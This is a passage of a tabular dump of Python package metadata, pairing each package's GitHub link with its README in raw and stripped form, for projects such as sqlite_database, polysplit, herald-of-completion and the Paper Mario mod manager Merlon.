[![asciicast](https://asciinema.org/a/as6OC8KH0Oe6w78Yw10TexmsV.svg)](https://asciinema.org/a/as6OC8KH0Oe6w78Yw10TexmsV)

# Examples

The [examples/](examples/) folder contains examples showing this module behavior.

Run the samples with:

```shell
# Create and activate a virtual environment
pip install -e .
python examples/zerodivision.py
```

# License

See [LICENSE](LICENSE) file for details.",omab/pychaterr
sqlite-database,https://github.com/RimuEirnarn/sqlite_database,0,2716,2674,"# SQLite Database

<div align=""center"">

![GitHub forks](https://img.shields.io/github/forks/RimuEirnarn/sqlite_database?style=social)
![GitHub Repo stars](https://img.shields.io/github/stars/RimuEirnarn/sqlite_database?style=social)

![GitHub closed issues](https://img.shields.io/github/issues-closed-raw/RimuEirnarn/sqlite_database)
![GitHub closed pull requests](https://img.shields.io/github/issues-pr-closed/RimuEirnarn/sqlite_database)
![GitHub code size in bytes](https://img.shields.io/github/languages/code-size/RimuEirnarn/sqlite_database)
![GitHub all releases](https://img.shields.io/github/downloads/RimuEirnarn/sqlite_database/total)
![GitHub Workflow(pylint) Status](https://img.shields.io/github/actions/workflow/status/RimuEirnarn/sqlite_database/pylint.yml?label=lint)
![GitHub Workflow(pytest) Status](https://img.shields.io/github/actions/workflow/status/RimuEirnarn/sqlite_database/python-app.yml?label=tests)
![GitHub Workflow(pypi) Status](https://img.shields.io/github/actions/workflow/status/RimuEirnarn/sqlite_database/python-publish.yml)
![GitHub release (latest by date)](https://img.shields.io/github/v/release/RimuEirnarn/sqlite_database)
![GitHub](https://img.shields.io/github/license/RimuEirnarn/sqlite_database)
![GitHub last commit](https://img.shields.io/github/last-commit/RimuEirnarn/sqlite_database)
    
![PyPI - Format](https://img.shields.io/pypi/format/sqlite-database)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/sqlite-database)
![PyPI - Implementation](https://img.shields.io/pypi/implementation/sqlite-database)

</div>

SQLite Database is a weird wrapper for SQLite Connection. It's intended to be easy to use and simple.

I will (always) try to bring more simplifications and others that could be done with SQL in general.

## Installation

Installation from PyPI is now available, `pip install sqlite-database`

From previous versions, installations can be done using `https://github.com/RimuEirnarn/sqlite_database/archive/refs/tags/<latest version>.zip`

## Features

Feature overview can be found in [Features.md](https://github.com/RimuEirnarn/sqlite_database/blob/main/Features.md)

## History & Pre-contributors

You can read why this library exists by reading [the history](https://github.com/RimuEirnarn/sqlite_database/blob/main/History.md). The pre-contributor is only ChatGPT.

## Contributing

You can submit any issue if you found a good issue. You can submit a pull request as long as the thing you want complies with what this project aims for.

## License

This library/wrapper/repo/project is licensed with/in BSD 3-Clause ""New"" or ""Revised"" License.

[LICENSE](https://github.com/RimuEirnarn/sqlite_database/blob/main/LICENSE)
","# SQLite Database



![GitHub forks](https://img.shields.io/github/forks/RimuEirnarn/sqlite_database?style=social)
![GitHub Repo stars](https://img.shields.io/github/stars/RimuEirnarn/sqlite_database?style=social)

![GitHub closed issues](https://img.shields.io/github/issues-closed-raw/RimuEirnarn/sqlite_database)
![GitHub closed pull requests](https://img.shields.io/github/issues-pr-closed/RimuEirnarn/sqlite_database)
![GitHub code size in bytes](https://img.shields.io/github/languages/code-size/RimuEirnarn/sqlite_database)
![GitHub all releases](https://img.shields.io/github/downloads/RimuEirnarn/sqlite_database/total)
![GitHub Workflow(pylint) Status](https://img.shields.io/github/actions/workflow/status/RimuEirnarn/sqlite_database/pylint.yml?label=lint)
![GitHub Workflow(pytest) Status](https://img.shields.io/github/actions/workflow/status/RimuEirnarn/sqlite_database/python-app.yml?label=tests)
![GitHub Workflow(pypi) Status](https://img.shields.io/github/actions/workflow/status/RimuEirnarn/sqlite_database/python-publish.yml)
![GitHub release (latest by date)](https://img.shields.io/github/v/release/RimuEirnarn/sqlite_database)
![GitHub](https://img.shields.io/github/license/RimuEirnarn/sqlite_database)
![GitHub last commit](https://img.shields.io/github/last-commit/RimuEirnarn/sqlite_database)
    
![PyPI - Format](https://img.shields.io/pypi/format/sqlite-database)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/sqlite-database)
![PyPI - Implementation](https://img.shields.io/pypi/implementation/sqlite-database)



SQLite Database is a weird wrapper for SQLite Connection. It's intended to be easy to use and simple.

I will (always) try to bring more simplifications and others that could be done with SQL in general.

## Installation

Installation from PyPI is now available, `pip install sqlite-database`

From previous versions, installations can be done using `https://github.com/RimuEirnarn/sqlite_database/archive/refs/tags/.zip`

## Features

Feature overview can be found in [Features.md](https://github.com/RimuEirnarn/sqlite_database/blob/main/Features.md)

## History & Pre-contributors

You can read why this library exists by reading [the history](https://github.com/RimuEirnarn/sqlite_database/blob/main/History.md). The pre-contributor is only ChatGPT.

## Contributing

You can submit any issue if you found a good issue. You can submit a pull request as long as the thing you want complies with what this project aims for.

## License

This library/wrapper/repo/project is licensed with/in BSD 3-Clause ""New"" or ""Revised"" License.

[LICENSE](https://github.com/RimuEirnarn/sqlite_database/blob/main/LICENSE)
",rimueirnarn/sqlite_database
odoo-addon-hr-attendance-calendar-view,https://github.com/OCA/hr-attendance,1,0,0,,,oca/hr-attendance
polysplit,https://github.com/r1p71d3/polysplit,17,2107,2107,"# polysplit

A lightweight library for splitting polygons into regions based on proximity of points.\
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
![issues](https://img.shields.io/github/issues/r1p71d3/polysplit)
[![codecov](https://codecov.io/gh/r1p71d3/polysplit/branch/main/graph/badge.svg?token=8S2VJLZG7U)](https://codecov.io/gh/r1p71d3/polysplit)
[![Build Status](https://github.com/r1p71d3/polysplit/actions/workflows/build.yml/badge.svg)](https://github.com/r1p71d3/polysplit/actions/workflows/build.yml)


## Overview
Map quantization is the procedure of dividing a continuous map into a number of discrete regions. The simplest approach that has been used for hundreds of years is to overlap the map with a square grid. However, this approach ignores the geographical features of the map, making it suboptimal for certain applications. With this project, I would like to propose a novel algorithm that organically divides any given map into regions based on the relative travel time between different areas.

In its simple form, the proposed algorithm could be applied to a map (a polygon) with intraversible obstacles (holes). It works in 2 stages. In the first stage, the map is overlayed with a fine grid of $N$ points. Then, we calculate the shortest path (around the obstacles) betweeen every pair of points and construct the $N \times N$ distance matrix. In the second stage, we apply the k-medoids algorithm to the set of points, using the matrix from stage I as a distance function, and retrieve a set of $M$ centers. Finally, we construct a Voronoi graph around the centers, creating the regions.

## Installation

`pip install polysplit`

## Sample usage

```python
import polysplit
from shapely.geometry import Polygon

# Create a polygon with a hole
outer_coords = [(0, 0), (0, 1), (1, 1), (1, 0)]
hole_coords = [(0.4, 0.4), (0.4, 0.6), (0.6, 0.6), (0.6, 0.4)]
polygon = Polygon(outer_coords, [hole_coords])

# Split the polygon
regions = polysplit.polysplit_main(polygon, k=5, num_points=100, plot=True)
print(regions)
```
","# polysplit

A lightweight library for splitting polygons into regions based on proximity of points.\
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
![issues](https://img.shields.io/github/issues/r1p71d3/polysplit)
[![codecov](https://codecov.io/gh/r1p71d3/polysplit/branch/main/graph/badge.svg?token=8S2VJLZG7U)](https://codecov.io/gh/r1p71d3/polysplit)
[![Build Status](https://github.com/r1p71d3/polysplit/actions/workflows/build.yml/badge.svg)](https://github.com/r1p71d3/polysplit/actions/workflows/build.yml)


## Overview
Map quantization is the procedure of dividing a continuous map into a number of discrete regions. The simplest approach that has been used for hundreds of years is to overlap the map with a square grid. However, this approach ignores the geographical features of the map, making it suboptimal for certain applications. With this project, I would like to propose a novel algorithm that organically divides any given map into regions based on the relative travel time between different areas.

In its simple form, the proposed algorithm could be applied to a map (a polygon) with intraversible obstacles (holes). It works in 2 stages. In the first stage, the map is overlayed with a fine grid of $N$ points. Then, we calculate the shortest path (around the obstacles) betweeen every pair of points and construct the $N \times N$ distance matrix. In the second stage, we apply the k-medoids algorithm to the set of points, using the matrix from stage I as a distance function, and retrieve a set of $M$ centers. Finally, we construct a Voronoi graph around the centers, creating the regions.

## Installation

`pip install polysplit`

## Sample usage

```python
import polysplit
from shapely.geometry import Polygon

# Create a polygon with a hole
outer_coords = [(0, 0), (0, 1), (1, 1), (1, 0)]
hole_coords = [(0.4, 0.4), (0.4, 0.6), (0.6, 0.6), (0.6, 0.4)]
polygon = Polygon(outer_coords, [hole_coords])

# Split the polygon
regions = polysplit.polysplit_main(polygon, k=5, num_points=100, plot=True)
print(regions)
```
",r1p71d3/polysplit
andeplane-pyodide-kernel,https://github.com/jupyterlite/pyodide-kernel,19,2139,2139,"# jupyterlite-pyodide-kernel

> A Python kernel for [JupyterLite](https://jupyterlite.rtfd.io) powered by
> [Pyodide](https://pyodide.org),

[![ci-badge]][ci] [![lite-badge]][lite] [![docs-badge]][docs]

[ci-badge]: https://github.com/jupyterlite/pyodide-kernel/workflows/Build/badge.svg
[lite-badge]: https://jupyterlite.rtfd.io/en/latest/_static/badge.svg
[lite]: https://jupyterlite-pyodide-kernel.rtfd.io/en/latest/_static
[ci]: https://github.com/jupyterlite/pyodide-kernel/actions?query=branch%3Amain
[docs-badge]:
  https://readthedocs.org/projects/jupyterlite-pyodide-kernel/badge/?version=latest
[docs]: https://jupyterlite-pyodide-kernel.readthedocs.io/en/latest/?badge=latest

## Requirements

- `python >=3.8`
- `jupyterlite >=0.1.0b19`

## Install

To install the Pyodide kernel labextension and the CLI addons for `jupyter lite`, run:

```bash
pip install jupyterlite-pyodide-kernel
```

Then build your JupyterLite site:

```bash
jupyter lite build
```

⚠️ The documentation for advanced configuration is available from the main JupyterLite
documentation site:

- [configuring]
- [command line interface][cli]

[configuring]:
  https://jupyterlite.readthedocs.io/en/latest/howto/index.html#configuring-the-python-environment
[cli]: https://jupyterlite.readthedocs.io/en/latest/reference/cli.html

## Uninstall

To remove the extension, run:

```bash
pip uninstall jupyterlite-pyodide-kernel
```

## Development Install

Below is an short overview of getting up and running quickly. Please see the
[contributing guide][contrib] for full details.

### Development Requirements

**Recommended** a Python virtual environment provided by a tool of choice, e.g.

- `virtualenv`
- `mamba`
- `conda`

Ensure the local development environment has:

- `git`
- `nodejs 18`
- `python >=3.8`

### Development Quick Start

```bash
git clone https://github.com/jupyterlite/pyodide-kernel
cd pyodide-kernel
npm run quickstart
```

Then, serve the built demo site, documentation, and test reports with Python's built-in
http server:

```bash
jlpm serve
```

[contrib]: https://github.com/jupyterlite/pyodide-kernel/blob/main/CONTRIBUTING.md
","# jupyterlite-pyodide-kernel

> A Python kernel for [JupyterLite](https://jupyterlite.rtfd.io) powered by
> [Pyodide](https://pyodide.org),

[![ci-badge]][ci] [![lite-badge]][lite] [![docs-badge]][docs]

[ci-badge]: https://github.com/jupyterlite/pyodide-kernel/workflows/Build/badge.svg
[lite-badge]: https://jupyterlite.rtfd.io/en/latest/_static/badge.svg
[lite]: https://jupyterlite-pyodide-kernel.rtfd.io/en/latest/_static
[ci]: https://github.com/jupyterlite/pyodide-kernel/actions?query=branch%3Amain
[docs-badge]:
  https://readthedocs.org/projects/jupyterlite-pyodide-kernel/badge/?version=latest
[docs]: https://jupyterlite-pyodide-kernel.readthedocs.io/en/latest/?badge=latest

## Requirements

- `python >=3.8`
- `jupyterlite >=0.1.0b19`

## Install

To install the Pyodide kernel labextension and the CLI addons for `jupyter lite`, run:

```bash
pip install jupyterlite-pyodide-kernel
```

Then build your JupyterLite site:

```bash
jupyter lite build
```

⚠️ The documentation for advanced configuration is available from the main JupyterLite
documentation site:

- [configuring]
- [command line interface][cli]

[configuring]:
  https://jupyterlite.readthedocs.io/en/latest/howto/index.html#configuring-the-python-environment
[cli]: https://jupyterlite.readthedocs.io/en/latest/reference/cli.html

## Uninstall

To remove the extension, run:

```bash
pip uninstall jupyterlite-pyodide-kernel
```

## Development Install

Below is an short overview of getting up and running quickly. Please see the
[contributing guide][contrib] for full details.

### Development Requirements

**Recommended** a Python virtual environment provided by a tool of choice, e.g.

- `virtualenv`
- `mamba`
- `conda`

Ensure the local development environment has:

- `git`
- `nodejs 18`
- `python >=3.8`

### Development Quick Start

```bash
git clone https://github.com/jupyterlite/pyodide-kernel
cd pyodide-kernel
npm run quickstart
```

Then, serve the built demo site, documentation, and test reports with Python's built-in
http server:

```bash
jlpm serve
```

[contrib]: https://github.com/jupyterlite/pyodide-kernel/blob/main/CONTRIBUTING.md
",jupyterlite/pyodide-kernel
stylgebra,https://github.com/skieffer/stylgebra,5,3420,3420,"# Stylgebra: stylable algebraic expressions


Example
=======

Consider power expressions in SymPy:
```python
>>> from sympy import symbols
>>> x = symbols('x')
>>> expr1 = x**(-1)
>>> expr2 = x**(-2)
>>> expr1
1/x
>>> expr2
x**(-2)
```
By converting to a Stylgebra expression, we can set the rule for how to handle
negative exponents, like applying CSS styling to a web page:
```python
>>> from stylgebra.adapt import adapt_sympy_expr
>>> f = adapt_sympy_expr(expr2)
>>> f.format(rules={'Power': {'negative': 'sup'}})
'x^{-2}'
>>> f.format(rules={'Power': {'negative': 'frac'}})
'\\frac{1}{x^{2}}'
>>> f.format(rules={'Power': {'negative': 'inline'}})
'1/x^{2}'
```



The Problem
===========

This package supports the automatic generation of mathematical expressions, from
classes representing mathematical objects.

The problem is tricky because, while it is easy to represent any given mathematical
entity internally, we want quite fine-grained control over the way it is expressed
symbolically.

For example, if p = 7, here are several different ways of expressing the same sum:

    a_0 + a_1 + a_2 + ... + a_{p-2}
    a_0 + a_1 + ... + a_{p-2}
    a_0 + a_1 + a_2 + a_3 + a_4 + a_5
    a_{p-2} + a_{p-3} + ... + a_0
    a_{7-2} + a_{7-3} + ... + a_0
    a_5 + a_4 + ... + a_0

This problem is
essentially the same one that was solved in web browsers by HTML + CSS. The
HTML represents a hierarchical structure; the CSS lets us encode rules to
address elements of that structure and control the manner in which they are
displayed.

In the example above, the outermost structure might be ""Sum"". Its ""styling""
includes choices like whether the terms within it should be ordered with
rising or falling subscripts, and whether an ellipsis should be used, and if
so how many terms should come before it.

Within the ""Sum"" structure are the individual ""Term"" structures. Within these
would be a ""Base"" and ""Subscript"". Within some of the Subscripts in our example
appears a ""Variable"" p. Among the ""styling"" modalities for a Variable would be
the choice to appear _by name_ (""p"") or _by value_ (""7"" in this case).

Solution
========

Our solution begins with a `Formal` class, and a whole suite of subclasses
representing the various kinds of structural elements suggested in our example,
like sums, subscripts, variables, etc. This is the ""HTML"" side of our solution,
i.e. the elements out of which to build the hierarchical structure that is a
mathematical object.

As for the ""styling"" or ""CSS"" side of our solution, each Formal class has a
`format` method, which accepts a _mode_ and an optional _rule set_. The mode
determines the manner of expression of this first element of the structure; it
is like everything that goes between one pair of braces {} in CSS. The rule set
allows us to define the modes for all the elements lying below the one on which
the `format` method was called; it is like a whole CSS file.

Where CSS rules are defined using ""selectors"" based on ids, classes, and other
properties, we instead ensure that each element of a formal structure has a
_path_ (a tree address), as well as an _id_, and our rules are based on
regular expression matching of ids and/or paths.

Documentation
=============

Sorry, at the moment proper docs are in the works.

A lot can be learned from the docstring of the `format()` method of
each of the `Formal___` classes in `expressions.py` and other modules.
","# Stylgebra: stylable algebraic expressions


Example
=======

Consider power expressions in SymPy:
```python
>>> from sympy import symbols
>>> x = symbols('x')
>>> expr1 = x**(-1)
>>> expr2 = x**(-2)
>>> expr1
1/x
>>> expr2
x**(-2)
```
By converting to a Stylgebra expression, we can set the rule for how to handle
negative exponents, like applying CSS styling to a web page:
```python
>>> from stylgebra.adapt import adapt_sympy_expr
>>> f = adapt_sympy_expr(expr2)
>>> f.format(rules={'Power': {'negative': 'sup'}})
'x^{-2}'
>>> f.format(rules={'Power': {'negative': 'frac'}})
'\\frac{1}{x^{2}}'
>>> f.format(rules={'Power': {'negative': 'inline'}})
'1/x^{2}'
```



The Problem
===========

This package supports the automatic generation of mathematical expressions, from
classes representing mathematical objects.

The problem is tricky because, while it is easy to represent any given mathematical
entity internally, we want quite fine-grained control over the way it is expressed
symbolically.

For example, if p = 7, here are several different ways of expressing the same sum:

    a_0 + a_1 + a_2 + ... + a_{p-2}
    a_0 + a_1 + ... + a_{p-2}
    a_0 + a_1 + a_2 + a_3 + a_4 + a_5
    a_{p-2} + a_{p-3} + ... + a_0
    a_{7-2} + a_{7-3} + ... + a_0
    a_5 + a_4 + ... + a_0

This problem is
essentially the same one that was solved in web browsers by HTML + CSS. The
HTML represents a hierarchical structure; the CSS lets us encode rules to
address elements of that structure and control the manner in which they are
displayed.

In the example above, the outermost structure might be ""Sum"". Its ""styling""
includes choices like whether the terms within it should be ordered with
rising or falling subscripts, and whether an ellipsis should be used, and if
so how many terms should come before it.

Within the ""Sum"" structure are the individual ""Term"" structures. Within these
would be a ""Base"" and ""Subscript"". Within some of the Subscripts in our example
appears a ""Variable"" p. Among the ""styling"" modalities for a Variable would be
the choice to appear _by name_ (""p"") or _by value_ (""7"" in this case).

Solution
========

Our solution begins with a `Formal` class, and a whole suite of subclasses
representing the various kinds of structural elements suggested in our example,
like sums, subscripts, variables, etc. This is the ""HTML"" side of our solution,
i.e. the elements out of which to build the hierarchical structure that is a
mathematical object.

As for the ""styling"" or ""CSS"" side of our solution, each Formal class has a
`format` method, which accepts a _mode_ and an optional _rule set_. The mode
determines the manner of expression of this first element of the structure; it
is like everything that goes between one pair of braces {} in CSS. The rule set
allows us to define the modes for all the elements lying below the one on which
the `format` method was called; it is like a whole CSS file.

Where CSS rules are defined using ""selectors"" based on ids, classes, and other
properties, we instead ensure that each element of a formal structure has a
_path_ (a tree address), as well as an _id_, and our rules are based on
regular expression matching of ids and/or paths.

Documentation
=============

Sorry, at the moment proper docs are in the works.

A lot can be learned from the docstring of the `format()` method of
each of the `Formal___` classes in `expressions.py` and other modules.
",skieffer/stylgebra
nlvwxpython,https://github.com/nielathome/Phoenix,4,619,467,"This is a fork of the Phoenix Python bindings for the wxWidgets GUI toolkit.
The fork extends the capabilities of the bundled Scintilla editor control to
support near instant viewing of text files up to 2GB in size by virtualising
the document interfaces.
 
The fork is only intended to be used by the NLV project.
 
For more information on the base code please refer to the
`README file <https://github.com/wxWidgets/Phoenix/blob/wxPython-4.2.0/README.rst>`_,
the `Migration Guide <http://docs.wxPython.org/MigrationGuide.html>`_,
or the `wxPython API documentation <http://docs.wxPython.org/index.html>`_.
","This is a fork of the Phoenix Python bindings for the wxWidgets GUI toolkit.
The fork extends the capabilities of the bundled Scintilla editor control to
support near instant viewing of text files up to 2GB in size by virtualising
the document interfaces.
 
The fork is only intended to be used by the NLV project.
 
For more information on the base code please refer to the
`README file `_,
the `Migration Guide `_,
or the `wxPython API documentation `_.
",nielathome/phoenix
boat-fib-py,https://github.com/zhongjunhang/boat-fib-py,0,52,52,"# A basic library that calculate Fibonacci numbers
","# A basic library that calculate Fibonacci numbers
",zhongjunhang/boat-fib-py
pyshortext,https://github.com/fenixinvitado2021/shorturl,1,0,0,,,fenixinvitado2021/shorturl
lightning-rod,https://github.com/reapermc/lightning-rod,4,348,348,"# lightning-rod

[![GitHub Actions](https://github.com/reapermc/lightning-rod/workflows/CI/badge.svg)](https://github.com/reapermc/lightning-rod/actions)

> Function library for the Bolt scripting language.

## Installation

```bash
pip install lightning_rod
```

---

License - [MIT](https://github.com/reapermc/lightning-rod/blob/main/LICENSE)


","# lightning-rod

[![GitHub Actions](https://github.com/reapermc/lightning-rod/workflows/CI/badge.svg)](https://github.com/reapermc/lightning-rod/actions)

> Function library for the Bolt scripting language.

## Installation

```bash
pip install lightning_rod
```

---

License - [MIT](https://github.com/reapermc/lightning-rod/blob/main/LICENSE)


",reapermc/lightning-rod
herald-of-completion,https://github.com/sho-87/herald-of-completion,6,6021,6015,"# Herald of Completion

[![Version](https://img.shields.io/github/v/release/sho-87/herald-of-completion?include_prereleases&sort=semver)](https://pypi.org/project/herald-of-completion/)
[![pypi](https://img.shields.io/pypi/pyversions/herald-of-completion)](https://pypi.org/project/herald-of-completion/)
![CI](https://img.shields.io/github/actions/workflow/status/sho-87/herald-of-completion/lint_test.yml?branch=develop)
[![Issues](https://img.shields.io/github/issues/sho-87/herald-of-completion)](https://github.com/sho-87/herald-of-completion/issues)
[![Donate](https://img.shields.io/badge/Buy%20me%20a%20coffee-donate-blue ""Donate"")](https://www.buymeacoffee.com/simonho)

Hark! The herald of completion has arrived ... to let you know when your long-running tasks are done.

Decorate your functions with messengers, who will send a notification to you when your function has finished running.

The notification can contain a message and, optionally, the traceback if your function failed.

## Installation

```bash
pip install herald-of-completion
```

## Usage

Wrap the `@herald` decorator around the function you want to be notified about:

```python
from herald.decorators import Herald
from herald.messengers import DiscordMessenger

herald = Herald("".env"")  # Specify location of your .env settings file
                         # herald is the name of your decorator

discord = DiscordMessenger()  # create a new messenger

@herald(discord)  # wrap decorator around the function, with the messenger you want to use
def my_function():
    a = [1, 2, 3]
    return a
```

You can send multiple messengers at the same time:

```python
from herald.decorators import Herald
from herald.messengers import DiscordMessenger, EmailMessenger

herald = Herald("".env"")

discord = DiscordMessenger()
email = EmailMessenger(""recipient@email.com"")  # some messengers take arguments

@herald([discord, email])  # multiple messengers can be used at the same time
def my_function():
    a = [1, 2, 3]
    return a
```

Passing `send_result=True` to the decorator will send the return value of your function through the messenger. This also includes notifying you of any exceptions that were raised:

```python
from herald.decorators import Herald
from herald.messengers import DiscordMessenger

herald = Herald("".env"")

discord = DiscordMessenger()

@herald(discord, send_result=True)
def my_function():
    a = [1, 2, 3]
    return a[100]  # if an exception is raised, `send_result=True` will also send the traceback
```

For more details, the full API documentation can be found here: [Documentation](https://sho-87.github.io/herald-of-completion/)

### .env settings

Some messengers require credentials and/or additional settings to work. These values are stored in a `.env` file.

Pass the location of this file to the `Herald` constructor, which will pass the values down to your messengers.

The `.env` file should look something like this. You only need settings for the messengers you want to use:

```text
# Discord settings
WEBHOOK_URL=""https://discord.com/...""

# Email settings
SMTP_SERVER=""smtp.gmail.com""
SMTP_PORT=587
SMTP_STARTTLS=True
SMTP_USER=""user@gmail.com""
SMTP_PASSWORD=""password""
```

Given the contents of this file, make sure you don't check it in to version control!

#### Explanation

| Name            | Value Type | Messenger | Description                                                                                                                     |
| --------------- | ---------- | --------- | ------------------------------------------------------------------------------------------------------------------------------- |
| `WEBHOOK_URL`   | str        | Discord   | The webhook URL for your server. Instructions [here](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks) |
| `SMTP_SERVER`   | str        | Email     | STMP server of the email address you want to send _from_                                                                        |
| `SMTP_PORT`     | int        | Email     | STMP port of the email address you want to send _from_                                                                          |
| `SMTP_STARTTLS` | bool       | Email     | Whether your server uses STARTTLS for authentication                                                                            |
| `SMTP_USER`     | str        | Email     | Your email username                                                                                                             |
| `SMTP_PASSWORD` | str        | Email     | Your email password                                                                                                             |

## Contribution

### Creating a new messenger

Creating a new messenger is straightforward and requires only 1 file:

1. Create a new module in `src/herald/messengers/`
2. Your class name should take the form `<Name>Messenger` and inherit the base `Messenger` abstract class. Example: `class DiscordMessenger(Messenger): ...`
3. Your class must implement the abstract methods defined in the base `Messenger` class [here](https://github.com/sho-87/herald-of-completion/blob/develop/src/herald/types.py)
4. Those methods define how your messenger sets it's secret values, and how it uses those settings to send a notification
5. Finally, import your messenger in the `__init__.py` file [here](https://github.com/sho-87/herald-of-completion/blob/develop/src/herald/messengers/__init__.py). This shortens the import path for users.

**Note**: Pull requests should be made to the `develop` branch.

### Tests

Unit and integration tests are located [here](https://github.com/sho-87/herald-of-completion/tree/develop/tests).

Tests should be run using `pytest`.

### Code style

The project is formatted using the `black` formatter.

Docstrings should follow the [Google style](https://google.github.io/styleguide/pyguide.html#38-comments-and-docstrings). This will help with automatic generation of documentation.
","# Herald of Completion

[![Version](https://img.shields.io/github/v/release/sho-87/herald-of-completion?include_prereleases&sort=semver)](https://pypi.org/project/herald-of-completion/)
[![pypi](https://img.shields.io/pypi/pyversions/herald-of-completion)](https://pypi.org/project/herald-of-completion/)
![CI](https://img.shields.io/github/actions/workflow/status/sho-87/herald-of-completion/lint_test.yml?branch=develop)
[![Issues](https://img.shields.io/github/issues/sho-87/herald-of-completion)](https://github.com/sho-87/herald-of-completion/issues)
[![Donate](https://img.shields.io/badge/Buy%20me%20a%20coffee-donate-blue ""Donate"")](https://www.buymeacoffee.com/simonho)

Hark! The herald of completion has arrived ... to let you know when your long-running tasks are done.

Decorate your functions with messengers, who will send a notification to you when your function has finished running.

The notification can contain a message and, optionally, the traceback if your function failed.

## Installation

```bash
pip install herald-of-completion
```

## Usage

Wrap the `@herald` decorator around the function you want to be notified about:

```python
from herald.decorators import Herald
from herald.messengers import DiscordMessenger

herald = Herald("".env"")  # Specify location of your .env settings file
                         # herald is the name of your decorator

discord = DiscordMessenger()  # create a new messenger

@herald(discord)  # wrap decorator around the function, with the messenger you want to use
def my_function():
    a = [1, 2, 3]
    return a
```

You can send multiple messengers at the same time:

```python
from herald.decorators import Herald
from herald.messengers import DiscordMessenger, EmailMessenger

herald = Herald("".env"")

discord = DiscordMessenger()
email = EmailMessenger(""recipient@email.com"")  # some messengers take arguments

@herald([discord, email])  # multiple messengers can be used at the same time
def my_function():
    a = [1, 2, 3]
    return a
```

Passing `send_result=True` to the decorator will send the return value of your function through the messenger. This also includes notifying you of any exceptions that were raised:

```python
from herald.decorators import Herald
from herald.messengers import DiscordMessenger

herald = Herald("".env"")

discord = DiscordMessenger()

@herald(discord, send_result=True)
def my_function():
    a = [1, 2, 3]
    return a[100]  # if an exception is raised, `send_result=True` will also send the traceback
```

For more details, the full API documentation can be found here: [Documentation](https://sho-87.github.io/herald-of-completion/)

### .env settings

Some messengers require credentials and/or additional settings to work. These values are stored in a `.env` file.

Pass the location of this file to the `Herald` constructor, which will pass the values down to your messengers.

The `.env` file should look something like this. You only need settings for the messengers you want to use:

```text
# Discord settings
WEBHOOK_URL=""https://discord.com/...""

# Email settings
SMTP_SERVER=""smtp.gmail.com""
SMTP_PORT=587
SMTP_STARTTLS=True
SMTP_USER=""user@gmail.com""
SMTP_PASSWORD=""password""
```

Given the contents of this file, make sure you don't check it in to version control!

#### Explanation

| Name            | Value Type | Messenger | Description                                                                                                                     |
| --------------- | ---------- | --------- | ------------------------------------------------------------------------------------------------------------------------------- |
| `WEBHOOK_URL`   | str        | Discord   | The webhook URL for your server. Instructions [here](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks) |
| `SMTP_SERVER`   | str        | Email     | STMP server of the email address you want to send _from_                                                                        |
| `SMTP_PORT`     | int        | Email     | STMP port of the email address you want to send _from_                                                                          |
| `SMTP_STARTTLS` | bool       | Email     | Whether your server uses STARTTLS for authentication                                                                            |
| `SMTP_USER`     | str        | Email     | Your email username                                                                                                             |
| `SMTP_PASSWORD` | str        | Email     | Your email password                                                                                                             |

## Contribution

### Creating a new messenger

Creating a new messenger is straightforward and requires only 1 file:

1. Create a new module in `src/herald/messengers/`
2. Your class name should take the form `Messenger` and inherit the base `Messenger` abstract class. Example: `class DiscordMessenger(Messenger): ...`
3. Your class must implement the abstract methods defined in the base `Messenger` class [here](https://github.com/sho-87/herald-of-completion/blob/develop/src/herald/types.py)
4. Those methods define how your messenger sets it's secret values, and how it uses those settings to send a notification
5. Finally, import your messenger in the `__init__.py` file [here](https://github.com/sho-87/herald-of-completion/blob/develop/src/herald/messengers/__init__.py). This shortens the import path for users.

**Note**: Pull requests should be made to the `develop` branch.

### Tests

Unit and integration tests are located [here](https://github.com/sho-87/herald-of-completion/tree/develop/tests).

Tests should be run using `pytest`.

### Code style

The project is formatted using the `black` formatter.

Docstrings should follow the [Google style](https://google.github.io/styleguide/pyguide.html#38-comments-and-docstrings). This will help with automatic generation of documentation.
",sho-87/herald-of-completion
vtb-biname,https://github.com/NguyenThaoVi0702/vtb_biname,4,0,0,,,nguyenthaovi0702/vtb_biname
merlon,https://github.com/nanaian/merlon,0,4078,4078,"# Merlon

[![](https://img.shields.io/github/actions/workflow/status/nanaian/merlon/test.yml?branch=main)](https://github.com/nanaian/merlon/actions)
[![](https://img.shields.io/discord/279322074412089344?color=%237289DA&logo=discord&logoColor=ffffff)](https://discord.gg/paper-mario-modding-279322074412089344)
[![](https://img.shields.io/crates/v/merlon)](https://crates.io/crates/merlon)
[![](https://img.shields.io/pypi/v/merlon)](https://pypi.org/project/merlon/)

Merlon is a mod package manager for the Paper Mario (N64) decompilation.

Features:

- [x] Create packages (`merlon new`)
- [x] Export package to a file for distribution (`merlon export`)
- [x] Apply distributable files to a base ROM (`merlon apply`)
- [x] Compile current package to a modded ROM (`merlon build`)
- [x] Run modded ROM in an emulator (`merlon run`)
- [x] Package dependency management (`merlon add`)
- [x] Experimental GUI support (`merlon gui` when built with `--features gui`)
- [x] Experimental Python API (`pip install merlon`)

## Installation

> **Note:** If you use Windows, you will need to use WSL 2. See the [decomp installation instructions](https://github.com/pmret/papermario/blob/main/INSTALL.md#wsl-2) for more information.

See [releases](https://github.com/nanaian/merlon/releases) for pre-built binaries.

### From source

Merlon is written in Rust. To build from source, you will need to install the Rust toolchain. See [rustup.rs](https://rustup.rs/) for instructions.

Once you have the Rust toolchain installed, you can install Merlon from crates.io with:

```bash
cargo install merlon
```

If you have a clone of this repository, you can install Merlon with:

```bash
cargo install --path .
```

## Supported platforms

Merlon supports all platforms that the Paper Mario decompilation supports.

- Linux
    - Debian/Ubuntu
    - Arch Linux
    - openSUSE
    - Alpine Linux
    - Nix (nix-shell)
- macOS
- Windows (Windows Subsystem for Linux 2)

See the [decomp installation instructions](https://github.com/pmret/papermario/blob/main/INSTALL.md) for more information.

Additionally, Merlon has a number of runtime dependencies that should be available on your PATH:

- `git`
- `ninja`
- `python3`
- `tar`
- `bzip2`
- `openssl`

## Usage

Merlon is a command-line tool. Use `merlon help` for more information.

A quick tour:

```
$ merlon new ""My mod""
$ cd my-mod
$ merlon init
